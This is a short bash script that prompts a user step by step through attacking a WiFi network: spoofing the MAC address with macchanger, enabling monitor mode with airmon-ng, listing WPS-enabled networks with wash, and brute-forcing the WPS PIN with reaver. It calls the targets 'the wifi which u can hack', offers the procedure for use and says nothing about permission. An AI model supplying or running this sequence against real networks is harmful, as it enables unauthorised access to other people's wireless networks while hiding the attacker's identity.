#!/bin/bash

echo set ur wlan0 really down by:
echo '  ifconfig wlan0 down'
read                       
# ifconfig wlan0 down 

echo 'change the mac which is assigned to wlan0'
echo '  u will see the current mac and the fakedMac' 
echo '  macchanger -m 00:11:22:33:44:55 wlan0' 
read                                       
# macchanger -m 00:11:22:33:44:55         
                                         
echo 'put ur wlan0 to up'           
echo '  ifconfig wlan0 up'         
read                          
# ifconfig wlan0 up    

echo 'put ur wlan0 that it can do an injection'   
echo 'it will create another interface mon0 which will do the injection'  
echo 'so, from now, use mon0 which can do the injection'  
echo '  airmon-ng start wlan0'  
read                   
# airmon-ng start wlan0 

echo 'check that mon0 works'
echo '	iwconfig mon0'
read
# iwconfig mon0

echo 'see the wifi which u can hack'
echo 'u should see the wifi00 and its bssid00'
echo '	wash -i mon0'
read
# wash -i mon0

echo 'do the hacking'
echo '	reaver -i mon0 -b bssid00 -vv'
read

